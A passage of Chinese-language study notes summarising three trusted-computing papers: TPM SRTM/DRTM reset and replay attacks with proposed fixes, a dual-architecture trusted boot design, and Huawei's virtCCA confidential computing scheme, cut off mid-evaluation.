id="SRTM-Attack-Grey-Area-Vulnerability">SRTM Attack: Grey Area Vulnerability</h4><ul><li>在SRTM攻击中，攻击者通过重置TPM并重放事件日志中的正常测量值，成功伪造了TPM的PCR值。测试中所有支持TPM 2.0的设备都能成功实施攻击，而TPM 1.2设备在特定条件下会进入故障模式，防止攻击成功。</li><li>测试结果表明，TPM2.0设备普遍未能妥善处理状态保存和恢复，导致攻击能够重置并伪造PCR。</li></ul><h4 id="DRTM-Attack-Lost-Pointer-Vulnerability">DRTM Attack: Lost Pointer Vulnerability</h4><ul><li>所有支持Intel TXT和<code>tboot</code>的设备都暴露在此漏洞下，包括使用TPM2.0和1.2的设备。</li><li>通过对<code>tboot</code>源码的修改，攻击者能够挂钩函数指针，进而伪造<code>动态PCR</code>值，成功实现重放攻击。</li></ul><h2 id="Discussion-and-Solutions">Discussion and Solutions</h2><h3 id="Discussion">Discussion</h3><ol><li><strong>攻击后果的严重性</strong><ul><li>SRTM攻击允许攻击者绕过静态测量链，将恶意修改隐藏在可信状态中，从而欺骗远程验证。</li><li>DRTM攻击利用<code>tboot</code>漏洞伪造动态PCR值，威胁范围更广，因为它能够影响运行时的动态可信链，使整个系统对软件篡改不敏感。</li></ul></li><li><strong>现有安全假设的不足</strong><ul><li>SRTM假设TPM状态不可在不重启的情况下重置，但实际漏洞表明这种假设存在问题。</li><li>DRTM假设减少受信计算基（TCB）的规模可以提升安全性，但<code>tboot</code>的漏洞表明，DRTM实现仍可能受限于软件的脆弱性。</li></ul></li></ol><h3 id="Solutions">Solutions</h3><ol><li><p>SRTM</p><p><strong>改进BIOS/UEFI固件：</strong></p><ul><li>确保在没有保存状态的情况下，禁止调用<code>TPM2_Startup(CLEAR)</code>或限制其执行范围。</li><li>当<code>TPM</code>无法恢复到正常状态时，固件应该触发系统重启或进入“安全模式”（failure mode），而非允许<code>PCR</code>重新初始化。</li></ul><p><strong>强化规范细节：</strong></p><ul><li>TPM2.0规范需要明确规定当状态恢复失败时应采取的具体措施，而不仅仅依赖<code>CRTM</code>的“纠正措施”。</li><li>增强对异常情况下状态处理的规范化要求，从而减少厂商实现中潜在的不一致性。</li></ul></li><li><p>针对DRTM漏洞的解决方案</p><p><strong>修复<code>tboot</code>实现：</strong></p><ul><li>对<code>tboot</code>中的动态测量逻辑进行全面审核，确保所有涉及的关键数据结构（如函数指针）都受到测量保护。</li><li>将动态测量逻辑中使用的全局变量移出未初始化数据段或可写数据段，放入只读内存区域或测量范围内。</li></ul><p><strong>使用安全的编程实践：</strong></p><ul><li>引入不可变函数指针或通过硬件方式锁定关键数据结构，防止其被挂钩。</li><li>增加对敏感内存区域的保护措施，防止攻击者注入恶意代码。</li></ul></li><li><p>针对事件日志重放的对策</p><p><strong>保护事件日志：</strong></p><ul><li>BIOS/UEFI在启动过程中生成的事件日志可以被攻击者利用重放正常测量值，因此应在操作系统接管之前对事件日志进行加密或擦除。</li><li>TPM规范应加入针对事件日志重放的防御机制，例如禁止日志中敏感数据的重复使用。</li></ul><p><strong>增强远程验证机制：</strong></p><ul><li>在远程验证中增加对系统唤醒事件的监控，通过审计睡眠和唤醒的历史记录，检测是否存在重置和伪造的行为。</li></ul></li><li><p>长期方向：改进可信计算基础架构</p><p>作者指出，虽然DRTM通过减少TCB规模提升了安全性，但当前的实现表明，软件漏洞仍然可能破坏信任链。未来的可信计算架构应更加注重硬件与软件的协同防御：</p><ul><li>开发更强的硬件信任根（如更安全的动态测量触发机制）。</li><li>在软件层面加入多重冗余校验和完整性保护。</li></ul></li></ol><h1 id="Design-and-implementation-of-trusted-boot-based-on-a-new-trusted-computing-dual-architecture">Design and implementation of trusted boot based on a new trusted computing dual-architecture</h1><h2 id="Abstract-3">Abstract</h2><p>论文提出了一种新型的可信计算双体系架构，用以解决现有可信平台模块（<code>TPM</code>）技术的缺陷，如易被物理攻击、启动依赖CPU等问题。通过设计可信计算子系统和传统计算子系统的协作机制，以及新的可信启动流程，该架构能够提供更高的系统安全性和主动防御能力。</p><h2 id="Introduction-3">Introduction</h2><p>可信平台模块（<code>TPM</code>）是当前计算机系统中普遍使用的一种可信计算技术，其通过加密技术和硬件模块实现数据保护和平台完整性验证。然而，现有的<code>TPM</code>架构在实际应用中存在以下两大问题：</p><ol><li><strong>启动顺序问题</strong><br>在传统架构中，<code>TPM</code>作为从设备，其启动依赖于主CPU的初始化。主CPU会优先加载BIOS代码，并负责初始化<code>TPM</code>。这种流程带来一个安全隐患：如果BIOS代码遭到篡改，例如注入病毒（如<code>MoonBounce</code>病毒），整个系统的信任链条将被破坏。当前<code>TPM</code>架构无法保障在主CPU加载前就建立可信环境。</li><li><strong>物理安全问题</strong><br><code>TPM</code>芯片通常外置安装在主板上，这让其暴露于物理攻击。例如，攻击者可以使用探测设备截取<code>TPM</code>总线上的传输数据，甚至物理移除芯片以禁用其功能。此外，<code>TPM</code>作为从设备，其权限受限，无法主动控制整个计算系统。</li></ol><p>针对上述问题，本文提出了一种全新架构，核心目标包括：</p><ul><li><strong>确保可信模块启动优先</strong>：让系统的硬件根信任优先于其他组件启动，以建立可信的系统基础。</li><li><strong>增强物理安全性</strong>：通过将硬件根信任模块集成到CPU内部，避免外部暴露所带来的安全隐患。</li><li><strong>构建完整的可信链条</strong>：从硬件到软件逐层验证和保护，确保每一环节的安全性。</li></ul><h2 id="Related-work">Related work</h2><p>可信计算技术自1971年首次提出以来，经历了持续的发展，并被广泛应用于保障计算机系统的安全性。其中，Trusted Computing Group (<code>TCG</code>) 的可信平台模块（<code>TPM</code>）是目前最广泛使用的可信计算技术，其最新规范TPM 2.0于2014年发布，能够通过测量和验证来确保系统运行的可信性。然而，<code>TPM</code>技术仍然存在一些不足，例如启动次序滞后和易受物理攻击。</p><p>为应对这些问题，各大厂商和研究机构提出了多种改进方案。例如，IBM开发了基于PCIe卡的硬件协处理器，通过硬件测量实现系统启动的可信性；Intel提出的Trusted Execute Technology (<code>TXT</code>) 则利用CPU硬件和固件，实现可信执行环境（<code>TEE</code>）并强化启动过程。此外，ARM 的<code>TrustZone</code>技术通过硬件隔离的方式划分安全世界和普通世界，为敏感数据提供独立的运行环境。这些技术虽然各具优势，但仍存在架构复杂性高或易被攻击等问题。</p><p>总体来看，当前的研究为可信计算技术提供了诸多启发，但系统性地解决可信启动中的缺陷仍需要新的架构支持，这正是本文提出可信计算双体系架构的意义所在。</p><h2 id="Trusted-computing-dual-architecture-scheme">Trusted computing dual-architecture scheme</h2><h3 id="Design-of-trusted-computing-dual-architecture">Design of trusted computing dual-architecture</h3><p>该文提出的可信计算双体系架构创新性地将系统划分为<strong>传统计算子系统</strong>和<strong>可信计算子系统</strong>，通过硬件可信根的优先启动、资源隔离和高效通信机制，构建起从硬件到软件的完整可信链条。在架构设计、运行机制和整体优势方面，体现出对传统TPM架构的全面优化。</p><h4 id="可信计算子系统的设计与运行机制">可信计算子系统的设计与运行机制</h4><p>可信计算子系统是系统安全的核心，其主要功能由可信CPU（Trusted CPU）以及独立的硬件资源（如<code>ROM</code>、<code>SRAM</code>和加密模块）实现，具备以下特点：</p><ul><li><strong>硬件根信任的优先启动</strong><br>系统上电后，可信CPU率先加载嵌入式ROM中的启动代码（<code>on-chip boot loader</code>），完成自身初始化并启动加密模块。可信CPU通过片内总线读取并验证外部<code>SPI闪存</code>中的扩展启动代码（<code>off-chip boot loader</code>）和BIOS。验证完成后，传统计算子系统才会被允许启动，确保整个启动过程自硬件层面即受到信任。</li><li><strong>独立的硬件资源与权限隔离</strong><br>可信CPU通过专属的ROM存储不可篡改的启动代码和密钥，利用<code>SRAM</code>执行可信计算任务，并使用加密模块（如<code>AES</code>、<code>SHA</code>和<code>ECDSA</code>）对外部数据进行验证。可信计算子系统的所有资源对传统计算子系统完全隔离，但可信CPU可通过总线访问传统子系统的资源，实现主动的安全监控。</li><li><strong>分离的电源域设计</strong><br>可信计算子系统和传统子系统分别位于两个独立的电源域中。可信计算子系统优先上电并完成初始化，然后控制传统计算子系统的上电流程，避免传统架构中由于启动顺序错误导致的潜在安全漏洞。</li></ul><p>通过可信计算子系统的独立设计和优先启动机制，架构有效解决了传统TPM架构在启动可信性和权限控制上的问题。</p><h4 id="架构内通信与协作机制">架构内通信与协作机制</h4><p>可信计算子系统与传统计算子系统通过高性能片内总线（如<code>AXI总线</code>）实现通信和协作，优化了系统的效率和安全性：</p><ul><li><strong>片内总线的高性能设计</strong><br>采用先进可扩展接口（<code>AXI</code>）总线作为片内通信核心。<code>AXI</code>总线支持多主多从模式，其中可信CPU作为主设备拥有更高权限，可以访问传统计算子系统的所有资源（如内存、BIOS和外部存储）。而传统子系统则无法访问可信子系统的资源，从而实现资源隔离与权限控制。</li><li><strong>更高的传输效率</strong><br>相较于传统主板上的<code>SPI</code>总线，片内<code>AXI</code>总线具有更宽的数据通道（支持8至1024位）和更高的时钟频率（最高可达200 MHz）。这种设计显著提升了数据传输速率和运行效率，并降低了延迟。</li><li><strong>动态监控与主动验证</strong><br>在系统运行过程中，可信CPU通过<code>AXI</code>总线实时访问传统子系统的资源，并执行安全策略，例如定期测量内存的完整性或动态验证BIOS的安全性，从而确保整个系统始终处于可信状态。</li></ul><p>这种片内高速总线的设计不仅提升了架构的整体性能，还通过严格的访问控制强化了资源保护。</p><h4 id="硬件可信根的集成与设计优势">硬件可信根的集成与设计优势</h4><p>硬件可信根的集成设计是本文架构的重要创新，突破了传统TPM芯片外置的限制，为系统带来了更高的安全性和性能：</p><ol><li><strong>硬件根信任的芯片内集成</strong><br>硬件根信任模块（Trusted CPU）直接设计为CPU芯片上的一个IP模块，与传统计算CPU共用同一块硅片。其设计方法包括：<ul><li><strong>硬件资源共享与隔离</strong>：可信CPU通过共享的片内总线与其他IP模块（如内存控制器）交互，但可信CPU独占<code>ROM</code>和<code>SRAM</code>等关键资源，保障安全性。</li><li><strong>制造过程中的固化</strong>：可信CPU的启动代码和密钥在芯片制造过程中固化到ROM中，这种设计确保了可信根的不可篡改性。</li></ul></li><li><strong>片内高速总线的实现</strong><br>可信CPU和传统CPU通过片内<code>AXI</code>总线连接，该总线在设计上具有以下特点：<ul><li><strong>多主多从架构</strong>：<code>AXI</code>总线允许多个主设备（如可信CPU和传统CPU）同时访问多个从设备（如内存和<code>SPI</code>控制器）。</li><li><strong>权限管理机制</strong>：通过分配设备ID和访问权限，确保传统子系统无法访问可信子系统的专属资源，而可信CPU可主动控制传统子系统的资源访问权限。</li><li><strong>数据加密与保护</strong>：总线通信的数据可通过硬件加速的加密模块（如<code>AES</code>）加密传输，进一步增强安全性。</li></ul></li><li><strong>设计优势的综合体现</strong><ul><li><strong>启动可信性</strong>：可信CPU优先启动并对BIOS等外部数据进行验证，从硬件层面构建起完整的可信链条。</li><li><strong>物理安全性增强</strong>：可信CPU与计算CPU共用一块芯片，消除了<code>TPM</code>外置芯片易被拆卸或监控的物理安全隐患。</li><li><strong>运行效率优化</strong>：片内高速总线极大提升了数据传输速率，减少了传统架构中的启动时间延迟。</li></ul></li></ol><p>通过硬件可信根的集成和片内总线的优化设计，本文架构不仅在启动可信性和物理安全性上取得了突破，还显著提升了系统性能，为可信计算提供了全新的解决方案。</p><h3 id="Advantages-of-trusted-computing-dual-architecture">Advantages of trusted computing dual-architecture</h3><p>本文提出的可信计算双体系架构通过硬件可信根的集成、优先启动和系统级优化，显著提升了计算机系统的安全性和性能。</p><h4 id="启动可信性">启动可信性</h4><p>可信计算双体系架构通过硬件可信根（Trusted CPU）的优先启动，确保系统从最底层硬件开始构建可信链条：</p><ul><li><strong>硬件优先启动</strong>：系统通电后，可信CPU首先初始化自身并加载内嵌ROM中的启动代码（<code>on-chip boot loader</code>）。可信CPU完成自身初始化后，通过片内高速总线读取并验证扩展启动代码和BIOS的完整性，确保启动流程的每一步都可信。</li><li><strong>逐层验证的可信链</strong>：从可信CPU到BIOS，再到操作系统和应用程序，可信CPU通过加密技术（如<code>SHA</code>和<code>ECDSA</code>）逐层测量和验证每一环节的完整性。若检测到任何篡改，系统会中止启动并发出警报。</li><li><strong>避免BIOS篡改风险</strong>：传统<code>TPM</code>架构中BIOS优先启动的设计易导致安全漏洞，而双体系架构通过可信CPU控制BIOS加载的先决条件，完全规避了此类风险。</li></ul><p>这种逐步递进的验证方式使系统启动过程在硬件级别和逻辑级别都达到高度可信。</p><h4 id="物理安全性">物理安全性</h4><p>通过将硬件可信根集成到CPU内部，架构在物理安全性上取得了显著提升：</p><ul><li><strong>内嵌设计的不可篡改性</strong>：可信CPU被集成为CPU芯片上的IP模块，与传统计算CPU共享同一硅片。可信CPU内的启动代码和根密钥在芯片制造过程中固化到ROM中，确保其无法被篡改或替换。</li><li><strong>防止物理攻击</strong>：传统<code>TPM</code>芯片由于外置设计易受硬件攻击（如探测传输总线、物理拆卸等），而双体系架构通过内嵌设计完全消除了外部攻击面。可信计算子系统的独立资源和片内通信机制进一步强化了对关键数据的保护。</li><li><strong>安全的数据传输</strong>：片内高速总线通过访问权限管理机制和硬件加密功能（如<code>AES</code>）保护通信过程中的数据，避免了外部总线传输中常见的窃听和篡改风险。</li></ul><p>这一设计从根本上解决了传统<code>TPM</code>架构在物理层面暴露的安全隐患，为系统提供了更坚固的硬件防护。</p><h4 id="系统性能优化">系统性能优化</h4><p>可信计算双体系架构通过高效的片内通信和硬件加速技术，显著提高了系统运行效率：</p><ul><li><strong>片内高速总线</strong>：架构采用高性能的<code>AXI</code>总线，支持多主多从模式，实现了可信CPU和传统CPU之间的高速数据传输。相比传统的<code>SPI</code>总线，<code>AXI</code>总线提供了更高的带宽（支持8至1024位数据通道）和更低的延迟，显著缩短了系统的启动时间。</li><li><strong>硬件加速模块</strong>：可信CPU集成了硬件加速的加密引擎（如<code>AES</code>、<code>SHA</code>和<code>ECDSA</code>），在执行数据加密和完整性验证任务时比软件实现快数倍。例如，实验中硬件加速的<code>AES</code>加密在大数据块上达到了633.8 MB/s的速率，而软件实现仅为52.2 MB/s。</li><li><strong>启动流程优化</strong>：硬件可信根的优先启动和片内高效通信使启动流程更加紧凑，避免了传统<code>TPM</code>架构中因启动次序问题导致的时间延迟。对于启动时间敏感的用户（如个人电脑和移动设备），这种优化尤为重要。</li></ul><p>架构的性能提升不仅体现在启动阶段，还为可信计算的动态运行提供了更强大的计算能力和更快的响应速度。</p><h2 id="Scheme-of-trusted-boot-system">Scheme of trusted boot system</h2><p>可信计算可以对硬件、固件、GRand Unified Bootloader（<code>GRUB</code>）、操作系统和应用软件进行度量和验证，从而建立整个平台的信任链。信任链的来源决定了整条信任链的可靠性。下面重点介绍从硬件信任根启动到固件加载完成的可信启动流程设计，本文不涉及从固件到GRUB、到OS、到应用软件的阶段。</p><h3 id="Design-of-a-Secret-Key-System">Design of a Secret Key System</h3><ol><li><p><strong>根秘钥（Endorsement Key, EK）</strong></p><p>根秘钥（<code>EK</code>）是系统的硬件信任基础，由制造商在设备生产阶段生成。<code>EK </code>是一对非对称密钥（公钥和私钥），其私钥被直接固化在可信 CPU 内部的 ROM 中，这一过程在 CPU 晶圆生产阶段完成，确保了 <code>EK </code>的不可读取性和不可篡改性。<code>EK</code>的存在使每台设备拥有独一无二的身份，从硬件层面为系统建立了初始的信任。</p><p>在系统运行时，<code>EK</code>私钥的主要功能是加密其他秘钥（如制造商秘钥<code>MK</code>），从而为秘钥系统提供强大的加密保护。<code>EK</code>的公钥则可以被外部使用，用于设备认证或信任建立，例如向外部验证设备是否为可信硬件。</p><p><code>EK</code>的私钥和公钥被设计为无法直接暴露，确保根秘钥的安全性和独立性。通过这种硬件层面的隔离，<code>EK</code>在整个秘钥系统中扮演了不可替代的基础角色，直接决定了系统最底层的安全性。</p></li><li><p><strong>制造商秘钥（Manufacturer Key, MK）与公私钥对（ECDSA）</strong></p><p>制造商秘钥（<code>MK</code>）是系统中用于保护设备加载程序的对称加密密钥，由制造商生成并通过<code>EK</code>加密后存储。<code>MK</code>不直接存储原始密钥，而是以加密版本（<code>ENC_MK</code>）的形式存放于设备的<code>SPI Flash</code>中。在设备启动时，可信 CPU 使用<code>ROM</code>中的<code>EK</code>私钥，通过硬件加密引擎解密<code>ENC_MK</code>，从而恢复出 <code>MK</code>。恢复后的<code>MK</code>被用于解密加载程序或其他敏感数据，并确保这些数据在启动前未被篡改。</p><p>与<code>MK</code>一起工作的还有制造商的<code>ECDSA</code>公私钥对（<code>PubK_ECDSA</code>和<code>PriK_ECDSA</code>）。私钥（<code>PriK_ECDSA</code>）由制造商保存在安全服务器中，仅用于对加载程序或关键数据进行数字签名，而公钥（<code>PubK_ECDSA</code>）则被存储在设备的<code>SPI Flash</code>中，供可信CPU验证加载程序的数字签名。</p><p>为了防止公钥被篡改，制造商在生产阶段会计算公钥的哈希值（<code>HASH_PubK_ECDSA</code>）并将其固化到硬件信任根的ROM中。这一固化过程与<code>EK</code>的写入类似，在晶圆生产阶段完成，确保哈希值的不可更改性。在设备启动时，可信CPU从<code>SPI Flash</code>读取公钥（<code>PubK_ECDSA</code>），通过硬件加密引擎重新计算哈希值，与<code>ROM</code>中的<code>HASH_PubK_ECDSA</code>比对。如果匹配，则说明公钥未被篡改，可信CPU随后会使用公钥验证加载程序的数字签名，确保加载程序的来源和完整性可信。</p></li><li><p><strong>用户秘钥（User Key, UK）</strong></p><p>用户秘钥是用户在系统中的身份凭据，由用户生成一对非对称的公私钥（<code>UK_Pub和UK_Pri</code>）。用户公钥（<code>UK_Pub</code>）由用户提供给制造商，制造商将其使用<code>MK</code>加密后存储于设备的<code>SPI Flash</code>中，生成加密版本<code>ENC_UK_Pub</code>；用户私钥（<code>UK_Pri</code>）由用户自行保管，用于签名 BIOS 配置文件或其他用户自定义代码。</p><p>在BIOS签名验证过程中，可信CPU首先使用<code>MK</code>解密<code>ENC_UK_Pub</code>，恢复用户提供的公钥<code>UK_Pub</code>，然后使用该公钥验证BIOS的数字签名，确保用户提供的代码未被篡改。用户秘钥的引入使系统在保持制造商安全管理的同时，赋予用户一定的安全控制权，进一步增强了系统的灵活性和可信性。</p></li><li><p><strong>硬件支持与启动过程</strong></p><p>硬件在整个秘钥系统中起着核心支撑作用，其安全性直接决定了系统可信计算能力的高低。硬件信任根中的关键模块包括 ROM、硬件加密引擎和随机数生成器（<code>TRNG</code>）。ROM 存储了系统最核心的数据，包括<code>EK</code>私钥和 <code>HASH_PubK_ECDSA</code>，其不可修改性为系统提供了最基础的信任保障。硬件加密引擎负责执行<code>AES</code>加密解密、<code>ECDSA</code>签名验证和<code>SHA</code>哈希计算等操作，这些操作由硬件完成，比纯软件实现更加高效且安全。<code>TRNG</code>用于生成高质量的随机数，为秘钥生成提供支持，确保加密的强度。</p><p>启动过程中，可信 CPU 首先从ROM中读取<code>EK</code>和<code>HASH_PubK_ECDSA</code>，验证<code>SPI Flash</code>中存储的<code>PubK_ECDSA</code>和加载程序的数字签名。在这一过程中，硬件加密引擎会负责计算公钥的哈希值，并与ROM中的<code>HASH_PubK_ECDSA</code>进行比对。如果公钥可信，可信CPU会继续解密<code>ENC_MK</code>，恢复<code>MK</code>，并解密加载程序。随后，使用<code>PubK_ECDSA</code>验证加载程序的数字签名，确认程序完整性，最终启动系统。</p></li><li><p><strong>设计的安全性与优势</strong></p><p>这套秘钥系统结合硬件和加密算法，从根秘钥（<code>EK</code>）到用户秘钥（<code>UK</code>）层层加密保护，构建了一个严密的信任链。</p><ul><li><strong>硬件不可篡改性</strong>：<code>EK</code>和<code>HASH_PubK_ECDSA</code>固化于ROM中，确保了系统最底层的安全性；<code>SPI Flash</code>中的秘钥和加载程序经过加密保护，即使外部存储器被攻击，攻击者也无法直接提取关键数据。</li><li><strong>逐级验证机制</strong>：系统从硬件到软件逐层验证，所有关键组件（如公钥、加载程序、BIOS配置文件）都需通过数字签名和哈希比对，确保每一级运行环境的可信性。</li><li><strong>高效性能与抗攻击能力</strong>：硬件加密引擎支持高性能的加密与验证操作，同时抵御物理攻击，例如防止外部探测或拆卸。</li><li><strong>灵活性与可管理性</strong>：用户秘钥与制造商秘钥的结合，确保用户能够参与系统配置的安全管理，同时支持设备的批次化管理，适用于大规模生产。</li></ul><p>通过这些设计，秘钥系统为可信计算双架构提供了可靠的安全保障，不仅提高了设备的安全性，还增强了其在实际应用中的灵活性。</p></li></ol><h1 id="virtCCA-Virtualized-Arm-Confidential-Compute-Architecture-with-TrustZone">virtCCA: Virtualized Arm Confidential Compute Architecture with TrustZone</h1><p>这篇文章是华为的机密计算解决方案，可以参考一下华为的技术。</p><h2 id="ABSTRACT（摘要）">ABSTRACT（摘要）</h2><p>本文提出了virtCCA，一种在现有TrustZone硬件上虚拟化ARM机密计算架构(CCA)的方案。重点包括：</p><ul><li><p>virtCCA可在支持S-EL2(ARMv8.4+)和不支持S-EL2的平台上实现</p></li><li><p>完全兼容CCA API规范，包括输入参数、功能、返回值和错误处理</p></li><li><p>开发了完整的CCA软件和固件栈，包括KVM增强和TrustZone管理监控器(TMM)</p></li><li><p>评估显示运行cVM的开销可接受，virtCCA-SEL2在I/O密集型工作负载下开销&lt;29.5%，virtCCA-EL3在多数情况下优于基线</p></li></ul><h2 id="INTRODUCTION（引言）">INTRODUCTION（引言）</h2><p>本节首先介绍了机密计算（Confidential Computing）的发展背景，以及其在云计算中日益重要的地位。传统TEE（Trusted Execution Environment）如Intel SGX、AMD SEV和IBM PEF已经支持在云环境中为用户提供隔离的执行环境。而ARM虽然通过TrustZone较早实现了TEE，但其原始设计并不适合完整运行Linux等操作系统的cVMs（confidential VMs）。为此，ARM推出了CCA（Confidential Compute Architecture），引入Realm作为新的隔离环境。</p><p>然而，CCA硬件尚未普及，导致相关软件栈难以广泛部署。为弥合这一差距，作者提出了<strong>virtCCA</strong>：基于现有TrustZone硬件对CCA进行虚拟化实现。virtCCA不仅兼容CCA的软件接口，还能在不支持S-EL2（Secure EL2）的老旧硬件上运行，并且对cVM几乎不需要修改即可支持现有Linux发行版。</p><p>virtCCA核心思路是使用TrustZone的安全世界作为cVM的运行环境，同时通过一个受信任但简化的软件层——TrustZone管理监视器（TrustZone Management Monitor,TMM）负责管理cVM生命周期、CPU状态切换和内存隔离。</p><h2 id="BACKGROUND（背景）">BACKGROUND（背景）</h2><p>介绍了背景知识以及威胁模型</p><ol><li><strong>TEE</strong>：介绍了可信执行环境的基本概念和VM-based TEEs(如AMD SEV、Intel TDX)</li><li><strong>ARM平台</strong>：解释了ARM异常级别(ELs)和TrustZone的双世界架构</li><li><strong>ARM CCA</strong>：介绍了Realm世界、RME扩展和RMM的作用</li><li><strong>威胁模型</strong>：假设攻击者可能破坏hypervisor但无法物理接触平台，不考虑DoS和侧信道攻击</li></ol><h2 id="VIRTUALIZING-ARM-CONFIDENTIAL-COMPUTE-ARCHITECTURE（虚拟化ARM机密计算架构）">VIRTUALIZING ARM CONFIDENTIAL COMPUTE ARCHITECTURE（虚拟化ARM机密计算架构）</h2><p>详细描述了virtCCA的设计</p><h3 id="Overview（概述）">Overview（概述）</h3><p>本节介绍virtCCA的整体设计目标和架构思路。virtCCA的核心目标是在尚未具备ARM CCA硬件平台的情况下，在现有ARM架构上，尤其是支持TrustZone的平台上，构建与CCA规范兼容的机密计算环境。为了推动真实部署，virtCCA被设计成一种可直接替换CCA的实现方案，同时具备如下能力：良好的硬件兼容性、软件与固件兼容性、安全保障以及性能优化。</p><p>在硬件兼容性方面，virtCCA可以运行在支持ARMv8.4及以上的架构（支持S-EL2）以及更早期不支持S-EL2的架构上。在软件方面，virtCCA与CCA在API层保持兼容，Hypervisor中只需少量修改即可支持cVM管理，cVM镜像本身无需任何修改即可运行，因此可以运行现有的完整Linux发行版和应用程序。由于其接口与CCA保持一致，因此virtCCA的整个软件栈也可以原样应用于未来真正的CCA硬件平台。</p><p>在安全设计上，virtCCA复用了CCA的TCB最小化理念，采用隔离的可信软件TMM代替CCA中的RMM，负责对cVM状态的控制、隔离与转换。TMM运行在安全世界（S-EL2或EL3），而Hypervisor则保持在普通世界，二者之间通过TMI（Trusted Management Interface）通信，接口设计与CCA的RMI兼容。</p><p>virtCCA通过为每个cVM预分配一块连续、静态的secure memory区域，避免了复杂的动态内存委派（delegate）机制。这种设计降低了内存管理复杂度，同时也避免了频繁的安全态转换带来的性能损耗。</p><p>图1展示了virtCCA两种部署方式。virtCCA-SEL2在支持S-EL2的系统上运行，cVM运行在S-EL1，TMM运行在S-EL2；virtCCA-EL3在早期平台上运行，cVM运行在secure EL1/EL0，TMM运行在EL3，由ATF控制。无论哪种部署方式，TMM均通过TMI接口与KVM交互，完成cVM的生命周期管理和状态切换。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/af4ff3357d7612ccdef3704a7391a1d9-image.png" alt="af4ff3357d7612ccdef3704a7391a1d9-image"></p><h3 id="Memory-Isolation（内存隔离）">Memory Isolation（内存隔离）</h3><p>本节描述了virtCCA的两级内存隔离机制，分别用于普通世界与安全世界之间的隔离，以及多个cVM之间的隔离。</p><p>首先，virtCCA利用TZASC促进安全世界和正常世界之间的内存分离。</p><p>其次，virtCCA在多个相互不信任的cVM之间强制执行内存隔离。在virtCCA-SEL2中，TMM管理所有cVM的第2阶段页表，确保cVM使用的安全内存不重叠。在virtCCA-EL3中，系统通过将cVM的页表指定为只读来防止cVM访问另一个cVM的内存。因此，cVM对页表所做的任何修改都将由TMM在EL3处拦截和审核。</p><h3 id="Interrupt-and-Device-Virtualization（中断和设备虚拟化）">Interrupt and Device Virtualization（中断和设备虚拟化）</h3><p>本节讨论virtCCA在中断和设备虚拟化方面的处理机制。在CCA架构中，host提供virtual GIC（vGIC）给cVM使用，并能通过GIC vCPU接口注入虚拟中断。</p><p><strong>virtCCA-SEL2上的中断翻译</strong>。host仿真vGIC，TMM负责安全/非安全世界间中断类型转换。由于Linux内核中GIC驱动默认将中断配置为Group 1（非安全），在cVM中会被视为FIQ，但Linux只期望接收IRQ。为避免修改Linux内核，TMM将FIQ拦截并标记为IRQ，再通知KVM处理该中断并将其重新注入为vIRQ，最后通过ERET回到cVM继续执行。整个过程模拟了安全世界与普通世界中断切换，并在TMM中实现FIQ到IRQ的语义转换。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/a635b3b8a86f9317695ee3f1f0cee3f8-image.png" alt="a635b3b8a86f9317695ee3f1f0cee3f8-image"></p><p><strong>virtCCA-EL3上的中断虚拟化</strong>，由于secure world不支持中断虚拟化（即缺乏GIC list registers），TMM必须完全以软件方式模拟中断注入。TMM记录每个vCPU的中断上下文信息（如PC、PSTATE），根据中断类型构造新的处理上下文，并模拟list registers行为，将新PC写入ELR_EL1，实现虚拟中断注入。ERET指令之后恢复原状态。对GIC寄存器的访问则被替换为SMC调用，由TMM模拟响应。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/6611a1855e7aa8be434a84c62d5f4b72-image.png" alt="6611a1855e7aa8be434a84c62d5f4b72-image"></p><p><strong>MMIO访问</strong>。在virtCCA-SEL2中，由硬件生成translation fault，由TMM捕获并将访问交由KVM处理。在virtCCA-EL3中，无法依赖硬件故障机制，因此在Guest内核中将MMIO访问替换为SMC，由TMM模拟ESR内容并通知KVM。TMM还负责仿真PSCI与虚拟计时器等功能。</p><h3 id="Measurement-and-Attestation（测量和认证）">Measurement and Attestation（测量和认证）</h3><p>本节阐述virtCCA如何实现远程证明（attestation）机制，与CCA保持一致。</p><p>平台需要提供可靠的Root of Trust（RoT），包括：</p><ul><li>安全存储的平台私钥（Initial Attestation Key, IAK）；</li><li>不可篡改的引导代码（如ROM中的Bootloader）；</li><li>硬件/固件生成的随机源；</li><li>IAK证书在制造阶段由CA下发。</li></ul><p>平台启动过程中，Bootloader度量ATF并记录平台配置（生命周期状态、硬件设置），然后ATF度量TMM并生成cVM attestation key（CAK），记录整个启动流程。最终由IAK对平台测量结果与CAK进行签名，形成平台令牌（platform token）。</p><p>cVM在创建时由TMM度量其初始代码与数据段，生成cVM初始度量（CIM），随后加载页与执行环境时继续扩展CIM。度量信息通过TSI_MEASURE_EXTEND接口提供给OS，以便应用程序可将自身信息扩展至CIM中。最终cVM生成的度量结果由CAK签名形成cVM token，平台token中含有CAK公钥的hash，实现二者绑定。</p><p>在远程证明流程中，Verifier向cVM发送Challenge，cVM将其包含在签名报告中返回，通过验证签名与度量值确保cVM的完整性，并建立加密通道用于后续数据传输。</p><h2 id="Security-Analysis（安全性分析）">Security Analysis（安全性分析）</h2><p>virtCCA 的可信计算基仅包含 TrustZone 硬件、ATF 和 TMM。TMM 代码量约 3.2K（EL3）或 4K（SEL2），足够精简以进行形式化验证。cVM 内存在销毁时会被擦除，DMA 攻击被 TZASC 阻断。virtCCA 还通过上下文清理确保中断/异常时 hypervisor 获取不到 cVM 内部状态，安全模型基本等同于 ARM CCA。</p><h2 id="Evaluation（评估）">Evaluation（评估）</h2><h3 id="Experimental-Setup（实验设置）">Experimental Setup（实验设置）</h3><p>使用真实ARM服务器评估：</p><ul><li>virtCCA-SEL2：ARM V8.4服务器，64GB RAM</li><li>virtCCA-EL3：Kunpeng 920 CPU，256GB RAM</li></ul><h3 id="Sanity-Check-of-TMM-Interfaces（TMM接口健全性检查）">Sanity Check of TMM Interfaces（TMM接口健全性检查）</h3><p>实现了TEST框架验证18个TMI接口，覆盖多核处理、竞争条件等场景</p><h3 id="Micro-benchmarks（微基准测试）">Micro-benchmarks（微基准测试）</h3><p>测量常见hypervisor操作开销：</p><ul><li>IPI：virtCCA-SEL2(43.83μs) vs 原生(4.0μs)</li><li>I/O：virtCCA-SEL2(272.38μs) vs 原生(42.33μs)</li></ul><h3 id="Macro-benchmarks（宏基准测试）">Macro-benchmarks（宏基准测试）</h3><p>Redis、MySQL 等负载性能下降有限（&lt;10%），Apache（I/O 密集）最大约 29.5%；EL3 模式下 